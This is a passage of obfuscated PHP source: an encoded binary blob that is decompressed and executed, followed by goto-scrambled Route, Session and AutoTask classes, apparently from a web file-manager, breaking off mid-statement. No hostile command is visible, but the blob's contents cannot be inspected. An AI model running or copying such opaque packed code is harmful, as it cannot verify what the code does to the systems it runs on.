§tàY®ÈŒ<’ø]!•ÍT!”Â’ù·Ş…tçëÑŒµ»à‹H;Ï8iUÊ6o').base64_decode('eCIMHNMqiTTx7MVWsmDkbQedpK+RV5Dn/Qa0YY0WqVBAZNdQQZ5sqUBrnuYw4sg7uBh/DTE=').strrev('F¨bO“ßĞgIç-Ã´'."\n".'¼01ªãÂ–]¢m‚Ç5g:Œ(V*‚>å}¡>¨ë­+2'."\n".'†™Í')."\x5e\x7e\xcd\x20\x6e\x9a\x98\x95\x10\x3a\x48\x58\xf6\x3e\x2c\x8a\xa5\x85\xe0\x91\xd7\x8e\x58\x34\x11\xd\xb2\x97\x11\x9d\x32\x5b\x9a\x36\x87\x1d\x3f\x2c\x6a\x51\x2b\x4e\x6c\xcc\x2a\x90\xeb\x3b\xb1\x12\x9c\xef\xf0"."\x43\xa\x60\x43\xa1\x98\xcb\x71\x45\x56\x8c\xd0\x7c\xbf\x6c\x28\xff\xa7\x8b\x5c\xc4\xea\xa9\x9e\x29\xf2\x95\x2e\x8d\x5d\xd3\x82\x60\x99\xde\x3b\x33\xcb\x57\xe8\x27\xda\x99\x13\xd8\x8d\x81\x5\xc9\x92\x57\x59\xec"."\323\126\117\371\272\250\237\206\206\32\146\32\306\324\146\205\321\50\53\51\347\50\170\253\351\341\120\107\4\302\17\364\125\54\275\112\174\263\10\217\226\125\172\52\253\174\63\253\53\113\163\250\202".base64_decode('sjMf2xWqp8ZRJjwRBiwDsb0MRsKh9oQaBm6htm6+r0bYRRqW8NJMw0GuG1XQCVR9jmGVAQ0=').base64_decode('vXdJcPVaPecQw1KQZkzmP7iupqbGW1OL/jJ7Eea1tJ45qpGK1NTUk780g9x9AAo6c4gPD2g=')."\x8f\xfe\x8c\xe8\x3a\x74\x8\x36\x57\x74\x86\x2e\x32\x4e\xb5\x2b\x88\x2d\x5e\x15\xdc\x35\x98\x16\xa1\x1e\x8c\xb0\x8f\xb8\xf5\x65\x74\xd7\xf1\xee\xac\x42\xd4\xc\x20\xa6\xb\x20\x64\xa5\xb7\x52\xe3\xe0\x6\x9a\x91".base64_decode('T4rb7IqAunxn+yrqVD8BEPSdG1OjYmIFLaKG7w28g6Fcqkv+mI8BmiaK1xC8LMMrv5kElSg=')."\xd1\x13\x77\x88\x8e\xae\xa1\x3a\x4e\xdf\xc1\x38\x5\x71\x4d\x49\x3e\x66\x9c\x20\x89\x6b\x31\x4b\x2c\xf9\x43\xc6\x51\xf9\xaa\x90\x64\x73\x8b\x64\x12\xcb\x70\xbf\x31\x38\xda\xce\x5b\xa2\x4f\x73\xd1\x47\x6d\x0\x86".base64_decode('ZVZk2hxRBSODo6fyGAEp3sUYSqYkq3EMV7Y/ScW5Rp1QOAIOj/g2GTQyDtcLqlRVhu0iXJA=')."\215\44\341\254\211\337\10\307\35\365\342\176\327\13\50\42\372\26\340\217\226\121\355\154\326\137\5\50\16\215\222\7\21\350\343\330\104\362\123\177\170\311\204\333\356\311\46\363\346\270\361\160\253".base64_decode('NrKYNHvsEiz+BdqHLCXEEuj1XZA7E5YacGe56gTo3VlJBUgvLU2uGMuUxumu0sRtcJB7R5c=')."\175\11\123\241\225\244\307\146\301\23\61\102\211\210\265\61\54\35\141\175\371\202\331\217\60\301\222\201\206\322\73\312\47\363\342\245\45\313\24\342\275\227\313\311\211\370\62\263\331\241\342\46\71".base64_decode('ZtBSfPOUigq1WSnRucKljCB/W1BOxGdjWW2MHEucbeBDtzOF9+xzkI7JSOyClrP6ZC0YVkw=').strrev('ëM÷®Ç„¯a7'."\n".'‹$y'."\0".'î€Œ¿‚q'."\r".'ÇR£M:gm	a©i•pÂhU{_’¿,)P').strrev(':Ü1I,œõq×Ù`•²\'8Å/gŒÛjİá0UR8»åvò°aJÆ\\+9íæsW"¯')."\273\6\105\247\162\160\213\343\301\311\12\175\275\136\311\351\334\35\206\163\122\345\12\360\302\237\211\270\113\354\231\134\256\204\333\352\164\221\250\145\234\112\342\30\357\53\145\355\230\206\255\62\335".base64_decode('Vwfav9PZ4zmURgsFDL/jRsCHUArzWmzjR2PtQQcose3ALHVRss0+hMcBoRSbNMW5DUubiiI=')."\67\204\266\347\104\32\113\216\172\24\322\367\105\344\301\225\62\271\330\37\11\373\32\167\335\16\333\1\52\143\332\374\320\215\233\17\244\244\175\66\42\63\305\70\241\111\347\317\210\44\150\13\336".strrev('PIgt!Õ½Ÿ-³`¿	±ÚTPŠâC\\`n¢¸C­y<ÆT®ãıBW‚OzAYiŞ4‹ç¢%').strrev('7/óğŒVÀì¢QË÷¦;9A7%4Ş…šOAOŒº¡9¸›yVƒı2Ë•%Å®ÏW=é')."\201\175\315\111\244\11\257\324\100\322\56\312\236\353\244\247\100\120\114\122\361\222\230\131\157\255\302\271\140\225\266\114\43\263\244\14\122\276\34\103\354\22\7\113\266\176\104\132\26\57\366\362\273"."\153\27\153\312\314\7\25\231\363\143\366\200\270\1\342\245\13\217\300\222\363\120\263\330\5\277\30\231\134\205\174\263\244\12\315\303\314\227\60\34\224\163\54\374\350\113\47\233\305\162\71\145\76"."\x45\xb2\x24\x88\x26\x39\x37\xe\xd0\x11\x40\x82\x8c\x31\x9d\x29\x9d\x7b\x6b\xeb\xbc\xb3\xe1\x14\x24\x1b\x13\xb2\x3\x1e\xec\x35\x68\x9d\x49\x68\x80\x8f\xc8\x8c\xd4\x81\xca\x36\x94\x13\x65\x4c\x49\xb\x80\x38\xb3"."\22\136\170\210\7\57\76\237\304\325\27\217\351\134\205\233\170\267\222\311\275\120\152\242\232\335\270\100\147\271\174\12\25\234\335\344\320\305\167\25\100\153\302\231\17\57\271\10\206\207\72\330\62".strrev('Ur“€Zz’hDÆ‚©by0œ‘9Óƒ"Ì_¿Qg(C#¾“$ ,CŒKR­ù!ÅàF®‘š').base64_decode('Nfa04BBjto1xe3isPIk3b66Bb8kRlssR0nJEqDaqozZP4qVGdOY0gZ3wO1o7/DypkS9JKmA=').base64_decode('Ef4Pg0wjUx/V4TA4kjWSSiTaEg4GIk3h+DKlH1/lCkVF1F2VLFXVEo8n0ZVCxNZ0BhhK9/I=')."\67\210\160\320\333\213\216\24\336\24\77\212\131\342\320\105\6\5\215\211\67\40\235\315\122\104\324\13\45\55\346\260\155\143\246\244\16\26\306\227\51\235\21\262\144\251\160\276\240\227\226\37\323"."\261\216\244\324\143\251\102\261\114\157\240\174\371\57\220\7\244\344\322\210\123\322\163\123\165\336\310\15\33\226\41\126\75\253\61\46\267\36\150\152\13\267\253\201\110\44\272\334\241\304\54\256\41"."\xa\x5c\xe6\x92\x92\xdf\xff\x92\x66\x46\x4c\x2\xfd\xba\xec\x58\x53\x4e\x71\x3c\x90\xe2\x92\xc3\xd0\xe9\x93\x7d\xc1\xe6\xd9\x8d\x19\x3c\xac\xcc\x1f\xf5\xa1\x51\xe9\x7d\xbe\x7c\x41\x33\x2c\x5d\x4a\xa0\x4f\xc9\xd5"."\x82\x55\x9f\x96\xc9\x38\x1e\x9\xce\xf4\x49\xd1\xa2\x73\x5b\x2d\xfb\x29\x95\x7e\x80\xa5\x11\x9e\x77\xea\x2\xb1\x70\x4b\x6b\xe2\x7f\xdc\x55\x23\x25\x7c\x21\x1a\x29\xa6\x9d\xc6\x6d\xc4\xe9\x7b\x3f\x41\xf9\x69\x69"."\xf6\x4d\xf1\xaa\x54\x69\xca\xff\xf4\x7d\x43\x8f\xf4\x0\x30\x71\xfc\xc6\x1e\x58\x35\xc9\x9\xa\xd8\x7b\x9a\x16\x8e\xaa\xf4\xf9\x5e\xf1\x9\xc4\xac\x14\xc6\xf2\xf2\x6d\xaf\x3f\x5\x2d\x60\x1f\xb6\x21\x66\xc7\x84"."\43\342\10\203\113\101\43\370\53\364\140\213\316\353\130\366\310\16\73\114\216\207\50\7\0\334\241\221\351\172\240\321\255\313\357\170\176\261\344\33\344\111\37\232\327\205\107\201\112\366\210\61\241"."\30\327\174\27\125\335\71\145\72\200\262\25\41\21\343\5\224\6\245\206\76\45\312\237\147\122\26\63\117\30\342\3\304\3\143\50\233\267\35\207\376\126\331\262\107\232\22\66\113\252\274\17\56"."\x2\x37\x98\x4c\xfa\x87\xe7\x16\xc2\x84\xdc\x8a\xe3\x1f\x56\xd0\x34\xb3\x63\x25\x9\xe\x81\x59\x84\x8d\x80\xab\x4a\xe3\x67\xac\x72\x7d\xa6\xc\x69\xa2\xea\x8f\xd\xba\xe8\xab\xc0\x54\xe\xe1\x41\x27\xf\xdd\x2e"."\175\107\220\126\377\277\251\110\63\343\222\273\141\147\43\245\35\262\334\333\44\337\342\34\126\11\344\275\304\264\71\342\174\67\30\247\110\34\32\263\204\220\352\113\153\214\170\166\220\237\163\164\30"."\x43\x38\x9e\xea\xa2\x19\xa\x79\x9c\x5e\x41\xe4\x8\x66\x1f\x6b\x4\xb1\x53\x2f\x29\x2c\x7d\x7b\x3a\xfd\xe9\x86\x5f\x73\x8a\x4e\x50\x4a\x7\x9f\xac\xe6\xc8\x18\x4c\x1b\x99\x54\x81\xeb\x7a\x89\x84\x36\x5d\x88\x22".base64_decode('SC1EWvJaTnpF0vlAJhpHuXczscdW57Ns4rU7sfk6X//iCgaWWESW7XhvLmEmtH4PxWlMFkU=')."\254\161\114\16\313\312\374\144\24\50\223\211\13\205\61\360\22\226\342\41\317\241\122\152\350\176\44\115\132\225\234\350\312\6\57\375\304\315\50\50\37\272\254\264\373\15\235\155\34\216\142\64\311".strrev('0‰„s/MÕvPÉÒR8Ü^˜\\ÅššLK¤Ïâ$µJŠ•Äª´LëÈp+ÿÑgŞDÂâóå¯')."\24\107\375\354\240\327\273\0\60\271\111\166\345\316\205\357\210\12\361\3\264\277\364\212\36\353\255\1\115\301\172\102\114\101\153\320\44\7\60\237\174\164\203\2\312\142\346\4\7\61\227\136\201"."\31\216\125\215\61\11\261\325\364\355\131\102\66\144\312\127\76\225\60\334\204\272\172\201\120\60\273\131\272\327\141\307\24\314\231\155\206\37\265\370\23\270\122\224\257\2\347\203\176\164\271\220\237"."\x26\xbd\x8f\x9f\xa3\x70\x5c\xb0\x14\xb2\x3f\x29\xa1\x17\xe4\x7e\xb4\xb6\xf4\x1\x5e\xf6\xd8\x2e\x5b\x6f\xf0\xd2\x6e\x99\xe7\x73\xa7\x7c\x7d\xd7\x23\xcc\xc9\x3f\xef\x9d\x40\x61\xbc\x9c\x47\x73\xe9\x7c\x4a\x99\x33"."\44\374\330\122\162\362\161\37\172\370\144\270\52\304\334\23\226\60\113\305\326\102\13\302\361\66\260\64\152\240\207\245\357\13\113\140\220\306\135\54\144\74\104\41\304\303\164\60\313\76\121\354\170"."\265\320\75\241\345\120\2\107\243\31\171\310\235\205\214\170\373\223\366\110\314\246\74\105\137\330\31\60\317\40\347\305\224\223\314\326\57\356\55\260\113\165\167\61\303\261\132\20\153\40\154\41\251".strrev('8›ÏüåµÛK})÷´é’“-és'."\n".'=¡U°èW7³5\\_¦#YBî{7U6ei’íw')."\357\320\242\262\127\46\372\332\260\231\301\307\356\54\26\363\333\5\315\171\264\54\163\202\142\373\67\201\131\331\207\67\245\375\324\123\262\267\172\370\113\310\154\355\162\210\302\222\316\31\311\101\342"."\264\207\174\101\33\106\73\140\301\143\351\243\36\12\60\217\174\315\115\217\111\102\115\14\17\206\243\51\251\51\155\22\342\314\126\146\270\30\104\342\250\101\72\51\310\17\205\52\333\377\234\132\144"."\xb6\xd6\x4b\x9e\x2c\x37\x98\x79\x16\xa1\xb\x92\xc2\x20\x31\xa7\xe3\x4d\x61\xf\x1f\x62\x15\xf3\x29\x2d\x7\x48\xd7\xd7\x28\x26\x9b\x58\x63\xcb\x92\x28\xa3\xb3\x5\x3a\x3\x65\x10\x44\xe2\x60\x1c\x14\xac\x89\x9f"."\274\261\320\135\304\234\203\4\371\230\310\226\116\313\345\217\327\30\226\104\44\35\315\145\306\312\15\275\314\20\76\7\257\331\141\327\177\212\350\272\244\245\344\234\40\127\57\50\7\315\161\246\344".strrev('ù;°†<…0 ó6¸Íq)­p·øü°M‰Pª™GV¢‚ /®Ä*¢à%º¼d%Be{f¯pq').strrev('M)ÓSI5ïmÂĞ3t…wD\\ "0}$GpBÍsÒÓiqã$4švÙÿ’Q ä²H<-ûbaùO')."\x54\xdd\x84\x1\x23\x8e\x18\x82\x6d\xca\x61\xe9\x19\x70\xb4\x57\x46\x99\x59\xb\xea\x8e\x43\x2a\x80\xe2\x2\x3f\x24\xda\x9c\x72\x25\x32\x98\x91\xd5\x28\xde\xac\x27\xc7\x88\x99\x70\x80\x90\x3d\x3c\x38\xce\xa1\xfc".base64_decode('PVvHudRyP2qNOG7HOz0pwcUACYQtglgx0q9JDIrgRUSovZgVEUkqTw62PNPhCAO7k3QtdeY=')."\x5e\x3\x7b\x2b\x91\x6f\x50\xa9\xa7\x7a\x1a\x66\x27\xae\xff\xf5\x7b\xce\xff\xaf\x9e\x71\x9e\x5b\xc3\xee\x4f\xb8\xd\x24\xa1\xc7\x2c\xd2\x2\x7\x20\xe8\x36\xbe\xd1\xe6\x64\x9e\xa\xf1\x5d\x3\x72\x72\x14\x87\x1"."\162\241\131\360\15\13\202\103\342\134\347\237\371\26\145\56\107\65\166\341\251\145\62\22\337\121\376\310\50\334\16\230\146\246\127\53\370\20\116\16\362\27\332\313\105\334\306\332\161\255\117\227\373"."\334\105\344\351\50\61\216\5\310\75\202\274\340\264\162\325\344\47\277\21\275\311\113\324\222\264\205\122\244\126\270\326\47\24\366\162\206\305\222\72\126\106\102\303\116\71\202\346\261\275\336\5\11"."\242\40\355\174\253\102\142\354\112\212\211\356\43\376\217\353\150\263\120\22\363\37\304\15\21\114\203\354\50\42\232\147\122\200\152\330\131\172\116\141\324\220\270\247\1\242\50\23\102\107\122\11\371"."\x4c\x38\x26\xd7\x91\x28\xcf\x9b\xa0\x71\x3e\xa7\x5f\x2c\xa8\xd1\xe6\x7a\x91\x9c\x16\xb2\x64\xd8\x3a\x6e\x74\x4a\xb5\x60\x4a\x6b\x73\xca\x22\x57\xc1\x36\x1b\x4e\x49\x26\x9e\x56\x72\x1c\xac\xf1\xba\x12\x6a\xbd\xae"."\xe6\xf8\xa3\xec\xce\x45\xe3\x78\x25\x9c\x6a\xe\xa1\x95\x16\xc3\xd2\x2b\x26\xb9\x24\x17\x81\x44\x6b\xc0\x5b\x5a\x87\x2e\x90\xb8\x28\x33\xc5\x12\x2d\x4f\x31\x78\xa7\x84\xf4\x16\x87\x64\x78\x30\xca\xd3\x51\x30\x9"."\x93\xed\x4c\xe5\x12\x3d\x49\x55\x3e\x29\x89\xc8\xdd\x4c\x1b\x4d\x9e\xee\x2b\xd9\x15\x19\x11\x76\xcc\x14\x56\xc5\x14\x17\xd0\x89\x68\x2c\xa4\x2e\xf\x63\xa7\x26\xe1\x55\xa1\x4e\xe6\xf3\xdb\x30\xc9\xe3\x39\xac\xc9"."\xce\xb6\x2a\x62\xb0\x8\xb\x0\x9d\x1e\x9b\x4d\x81\x4a\x3a\x22\x8f\x92\xbc\x5e\x38\xae\xb6\xb3\xf9\x20\xbf\x2e\x77\x5a\xb5\x4b\x56\x32\xcc\xc5\x9b\x2c\x41\x76\x16\xc6\x16\x4e\xce\xb5\xb8\xa4\x5c\xb1\xa4\x59\xb0"."\x4a\xce\x17\x2c\x13\x73\xdc\x26\xca\x8d\x31\x1\x48\x1f\xd3\x79\xe9\xcc\xa1\x15\xad\x27\x6d\x3d\xa5\x60\x4e\xc1\x71\x30\xea\x9a\x53\x33\xbb\xe7\xf3\x9a\x9b\xc3\x9e\x7a\x44\x25\xe7\x7c\x41\x49\x38\xa1\xc5\x67\x7b".base64_decode('mfo2K1O2nkmdMZXLQ0gatx3YJB5pcj/O5HyMqV4SbdN3rhyvuJVMUrsZFDyMKw/TiKlzsXg=')."\200\53\7\260\7\170\260\72\244\37\173\204\303\366\74\176\202\210\160\43\261\122\315\252\114\23\14\13\145\204\154\216\220\336\322\203\65\174\311\56\214\105\13\261\154\173\211\37\105\247\151\236\124"."\x9f\x1c\xc6\xa8\x10\xce\x21\x8b\x3\x75\xf\x39\x49\x52\x7f\x40\x67\xda\x94\xf3\xc1\x3e\x92\x49\x92\x99\x1f\x7a\x68\x41\xba\xc0\x77\xea\x4f\x70\xab\xe7\x92\x3d\xb7\x68\x44\xa4\x6c\x52\x8b\xf9\x33\x46\xbf\xd8\x3f"."\103\130\170\354\42\331\364\166\62\340\76\144\112\265\72\35\362\2\111\333\42\111\210\111\250\364\162\135\334\371\113\214\54\253\206\5\16\202\231\160\245\113\304\127\154\217\332\260\140\313\305\171\56".base64_decode('lWpmL746iqZKTpwohRclbL3kWEVYX+kj8tehnLB2chQsTRWOV6T6rpM6GSZOKzd8Qgyd1WU=')."\307\56\34\251\104\22\175\266\214\253\46\111\142\20\254\312\45\164\226\350\120\270\4\116\174\322\351\106\206\27\343\163\206\312\20\73\114\257\43\325\165\220\307\302\116\306\173\272\262\100\374\47\65"."\137\126\112\50\241\200\236\211\110\315\311\312\26\123\126\210\227\377\210\300\112\47\210\45\377\73\42\203\161\67\246\3\370\322\366\306\7\6\45\143\162\246\243\73\145\120\203\35\107\144\241\165\151"."\246\231\311\340\353\363\51\262\251\376\265\264\31\227\226\20\262\155\332\41\162\372\26\13\207\46\146\211\360\212\346\5\234\131\264\274\356\202\233\134\301\15\123\132\303\361\112\250\234\76\142\330\311".base64_decode('tCQqKM0sTS+UTDN0oPw43L1ls+xWzRKNlPRH0htLmGXq0B6VrUazcE1xFHPUnQIEuC7NwnU=')."\x4b\xb2\x59\xe5\x12\xb8\x92\x7a\xb6\x56\xb4\xa6\x18\x5e\x29\xf0\x40\x28\x9a\x2a\x33\x60\x21\x6c\x94\x8a\x4e\x5\xcf\xb2\x85\x4b\x3f\x7\x6b\xc0\x5d\x9a\x88\xde\xca\xf7\x42\x92\x4d\x3a\x55\x78\xca\xf5\xa2\x6c\xe1"."\51\173\341\56\55\370\41\174\360\56\227\123\166\201\302\3\5\145\166\14\226\123\146\217\240\364\157\112\235\70\241\47\126\272\131\211\274\62\132\153\364\223\230\63\223\375\226\226\311\226\125\340\312"."\x2b\xc9\xc5\xca\xd2\x37\xcb\xa9\xbd\xe6\x4a\x77\x78\xac\xa6\x24\x89\x46\x98\x66\x6b\x41\x1f\x92\x2d\x97\x11\xb7\x98\x31\x6\x85\xbe\x30\xb3\x2b\x9a\xee\xd8\xd3\x8a\xb9\xc1\x9c\xc9\xf7\xc9\x94\xd0\x11\xc7\x4c\x5e"."\240\340\6\173\111\153\316\225\220\53\112\257\52\224\65\163\362\140\141\131\251\40\52\243\161\343\124\241\103\111\317\371\246\155\44\165\347\323\15\262\53\105\232\317\76\222\21\62\157\367\315\204\20"."\335\71\164\254\312\211\361\161\22\15\372\304\305\35\155\117\342\322\4\212\70\54\22\51\157\4\267\244\124\333\42\210\257\102\371\315\72\271\227\240\274\4\315\216\233\5\333\203\363\22\146\236\374"."\66\232\266\55\24\226\330\55\11\72\21\140\206\300\43\351\343\241\220\270\122\307\235\42\27\264\4\213\351\75\7\16\202\336\7\226\66\305\165\232\113\310\236\43\202\57\176\171\104\336\357\341\132"."\267\271\350\322\120\21\11\203\146\252\327\34\145\16\104\21\136\111\100\22\67\172\200\157\262\12\41\161\177\143\371\151\216\37\36\3\363\222\53\27\170\300\330\67\220\357\167\124\247\157\252\162\133"."\x80\xcf\x6b\x1\xae\x1b\x44\x13\xf4\x25\x20\x22\x42\x6\xb3\xc8\x78\x22\x5e\x92\xd5\x11\x88\xc7\x97\x47\x63\x4d\xf4\xe1\xa0\x92\x6c\x52\x4b\xd2\xcd\x2c\xc9\xea\x68\x8d\xb6\x4f\x95\x17\x6a\xb\x84\x23\x25\x79\x58"."\x8d\xb3\x5d\x15\x1e\x67\x69\x56\xb8\x83\xf4\x92\x68\x33\x4c\xd5\x8b\x70\x70\x99\xe8\x9\xbb\xee\x8c\xc0\x93\xb0\x62\x12\xa4\xeb\xbf\x7c\xda\x64\xb7\x7a\xac\x7c\x5c\x63\xaf\xb6\xcb\x17\x5f\x7a\x56\x38\x20\x16\x75"."\x9c\xa2\x36\xf9\x72\xcc\x62\x9e\xc2\x79\xc0\xf9\x36\xa7\x4b\x6f\xda\xa9\xf6\xc3\x30\x17\x9a\xc5\xda\x99\xed\xf0\xa5\x58\x1e\x52\xf1\x63\x4b\x9c\x0\xf0\x13\x85\x50\x10\xf2\x39\x74\x8f\xa4\x74\xb2\x48\x8\xd5\x91"."\326\256\274\277\223\353\141\56\201\43\331\63\313\2\257\314\255\245\254\172\205\163\5\160\160\67\117\145\57\54\14\230\275\342\20\7\247\73\360\200\0\340\226\364\161\151\330\221\155\153\375\114\100"."\xea\xd0\xb4\xa1\x72\x73\x4c\x14\x84\x44\xfb\xff\x0\xff\x37\xf8\x7a\x10\xbe\x0\x0", 10, -8))); goto Bòºù”„ï; e¨öçôÜê: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\156\171" => "\133\x5e\x2f\135\x2b", "\72\x6e\165\x6d" => "\133\60\55\x39\x5d\x2b", "\x3a\x61\x6c\x6c" => "\56\52"); public static $errorCallback; public static function __callstatic($ïÜ¯ÛÃ¹, $ÆË÷Â¡½) { $£àŒá =& $_SERVER[Î·Ü›öğ]; if ($ïÜ¯ÛÃ¹ == $£àŒá[1745]) { $õ™ÃÌ¼ = array_map($£àŒá[1746], $ÆË÷Â¡½[0]); $¾—è’ÜÈ = strpos($ÆË÷Â¡½[1], $£àŒá[8]) === 0 ? $ÆË÷Â¡½[1] : $£àŒá[8] . $ÆË÷Â¡½[1]; $´“ø›°å = $ÆË÷Â¡½[2]; } else { $õ™ÃÌ¼ = null; $¾—è’ÜÈ = strpos($ÆË÷Â¡½[0], $£àŒá[8]) === 0 ? $ÆË÷Â¡½[0] : $£àŒá[8] . $ÆË÷Â¡½[0]; $´“ø›°å = $ÆË÷Â¡½[1]; } array_push(self::$maps, $õ™ÃÌ¼); array_push(self::$routes, $¾—è’ÜÈ); array_push(self::$methods, strtoupper($ïÜ¯ÛÃ¹)); array_push(self::$callbacks, $´“ø›°å); } public static function error($ ø¹×¸È) { self::$errorCallback = $ ø¹×¸È; } public static function haltOnMatch($„ÉÖ¤Õš = true) { self::$halts = $„ÉÖ¤Õš; } public static function dispatch() { $‰Ûìì¤³ =& $_SERVER[Î·Ü›öğ]; $¢âÛëºÄ = parse_url($_SERVER[$‰Ûìì¤³[1747]], PHP_URL_PATH); $Î£§¼Ç¦ = $_SERVER[$‰Ûìì¤³[164]]; $à¾’³· = array_keys(static::$patterns); $³ı¢àª = array_values(static::$patterns); $¿¶‹Å à = !1; self::$routes = preg_replace($‰Ûìì¤³[1391], $‰Ûìì¤³[8], self::$routes); if (in_array($¢âÛëºÄ, self::$routes)) { $üô‰Í‚ = array_keys(self::$routes, $¢âÛëºÄ); foreach ($üô‰Í‚ as $ğ§˜äŠ) { if (self::$methods[$ğ§˜äŠ] == $Î£§¼Ç¦ || self::$methods[$ğ§˜äŠ] == $‰Ûìì¤³[1748] || in_array($Î£§¼Ç¦, self::$maps[$ğ§˜äŠ])) { $¿¶‹Å à = !0; if (!is_object(self::$callbacks[$ğ§˜äŠ])) { $ƒŠ”÷êŠ = explode($‰Ûìì¤³[8], self::$callbacks[$ğ§˜äŠ]); $­ĞşĞºÜ = end($ƒŠ”÷êŠ); $©š‰Å¯ù = explode($‰Ûìì¤³[1323], $­ĞşĞºÜ); $–“’ÍÚÎ = new $©š‰Å¯ù[0](); $–“’ÍÚÎ->{$©š‰Å¯ù[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$ğ§˜äŠ]); if (self::$halts) { return; } } } } } else { $ÏÇ÷À•Ç = 0; foreach (self::$routes as $ğ§˜äŠ) { if (strpos($ğ§˜äŠ, $‰Ûìì¤³[4]) !== !1) { $ğ§˜äŠ = str_replace($à¾’³·, $³ı¢àª, $ğ§˜äŠ); } if (preg_match($‰Ûìì¤³[1749] . $ğ§˜äŠ . $‰Ûìì¤³[1750], $¢âÛëºÄ, $ıÌá‰)) { if (self::$methods[$ÏÇ÷À•Ç] == $Î£§¼Ç¦ || self::$methods[$ÏÇ÷À•Ç] == $‰Ûìì¤³[1748] || !empty(self::$maps[$ÏÇ÷À•Ç]) && in_array($Î£§¼Ç¦, self::$maps[$ÏÇ÷À•Ç])) { $¿¶‹Å à = !0; array_shift($ıÌá‰); if (!is_object(self::$callbacks[$ÏÇ÷À•Ç])) { $ƒŠ”÷êŠ = explode($‰Ûìì¤³[8], self::$callbacks[$ÏÇ÷À•Ç]); $­ĞşĞºÜ = end($ƒŠ”÷êŠ); $©š‰Å¯ù = explode($‰Ûìì¤³[1323], $­ĞşĞºÜ); $–“’ÍÚÎ = new $©š‰Å¯ù[0](); if (!method_exists($–“’ÍÚÎ, $©š‰Å¯ù[1])) { echo $‰Ûìì¤³[1751]; } else { call_user_func_array(array($–“’ÍÚÎ, $©š‰Å¯ù[1]), $ıÌá‰); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$ÏÇ÷À•Ç], $ıÌá‰); if (self::$halts) { return; } } } } $ÏÇ÷À•Ç++; } } if ($¿¶‹Å à == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ó‚ş–¦œ =& $_SERVER[Î·Ü›öğ]; header($_SERVER[$ó‚ş–¦œ[1752]] . $ó‚ş–¦œ[1753]); echo $ó‚ş–¦œ[1754]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$‰Ûìì¤³[1747]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $”¡î¥¯ =& $_SERVER[Î·Ü›öğ]; static $ŠË²îÚ = false; if ($ŠË²îÚ) { return $ŠË²îÚ; } $ß‚èµÈÏ = $GLOBALS[$”¡î¥¯[6]][$”¡î¥¯[426]]; self::$sessionTime = $ß‚èµÈÏ[$”¡î¥¯[1755]]; $­À£Ë© = isset($GLOBALS[$”¡î¥¯[1756]]) ? $GLOBALS[$”¡î¥¯[1756]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($­À£Ë©)) { self::$sessionSign = Cookie::get($­À£Ë©); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($­À£Ë©, self::$sessionSign, self::$sessionTime); $¡ø¼µÛ§ = $ß‚èµÈÏ[$”¡î¥¯[1757]]; $Å¢ Æ¢é = $ß‚èµÈÏ[$¡ø¼µÛ§]; $«®©«“Ñ = $ß‚èµÈÏ[$”¡î¥¯[925]]; switch ($¡ø¼µÛ§) { case $”¡î¥¯[21]: self::$handle = Model($”¡î¥¯[926]); break; case $”¡î¥¯[927]: self::$handle = new CacheRedis($Å¢ Æ¢é, $«®©«“Ñ); break; case $”¡î¥¯[928]: self::$handle = new CacheMemcached($Å¢ Æ¢é, $«®©«“Ñ); break; case $”¡î¥¯[233]: $Å¢ Æ¢é[$”¡î¥¯[87]] = $Å¢ Æ¢é[$”¡î¥¯[87]] . $”¡î¥¯[1758]; self::$handle = new CacheFile($Å¢ Æ¢é, $«®©«“Ñ); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $ŠË²îÚ = new self(); return $ŠË²îÚ; } public static function getBySign($‘ñ’´Â£) { $ÑÖàÊÆ¹ = self::$handle->get($‘ñ’´Â£); $ÑÖàÊÆ¹ = unserialize($ÑÖàÊÆ¹); return is_array($ÑÖàÊÆ¹) ? $ÑÖàÊÆ¹ : array(); } public static function setBySign($àäı¦å, $àÇŞ—‡û) { CacheLock::lock($àäı¦å); self::$handle->set($àäı¦å, serialize($àÇŞ—‡û), self::$sessionTime); CacheLock::unlock($àäı¦å); } public static function sign($Ñ¥‚®¢é = false) { if ($Ñ¥‚®¢é) { self::$sessionSign = $Ñ¥‚®¢é; } self::init(); return self::$sessionSign; } public static function set($†€È‹³›, $ÈİÊÅÔ = false) { self::init(); if (is_array($†€È‹³›)) { foreach ($†€È‹³› as $Àá´”¸ø => $€ÕÏÎİ) { array_set_value(self::$data, $Àá´”¸ø, $€ÕÏÎİ); } } else { array_set_value(self::$data, $†€È‹³›, $ÈİÊÅÔ); } self::setBySign(self::$sessionSign, self::$data); } public static function get($Ê¯Ä…Å = false) { self::init(); if (!$Ê¯Ä…Å) { return self::$data; } return array_get_value(self::$data, $Ê¯Ä…Å); } public static function remove($½±Á¦Ğ) { self::init(); unset(self::$data[$½±Á¦Ğ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Î·Ü›öğ][933])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $Ÿô ÈÚì =& $_SERVER[Î·Ü›öğ]; if (self::valueGet($Ÿô ÈÚì[839]) != $Ÿô ÈÚì[91]) { return; } if (self::valueGet($Ÿô ÈÚì[1759]) == $Ÿô ÈÚì[91]) { $²²ÓŠšÛ = self::valueGet($Ÿô ÈÚì[1760]); if (time() - $²²ÓŠšÛ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($Ÿô ÈÚì[1759], $Ÿô ÈÚì[91]); self::log($Ÿô ÈÚì[1761] . ACTION . $Ÿô ÈÚì[1762]); Hook::bind($Ÿô ÈÚì[1763], $Ÿô ÈÚì[1764]); $›€µ£Æ‹ = 0; while (!0) { self::cacheClear(); if (self::valueGet($Ÿô 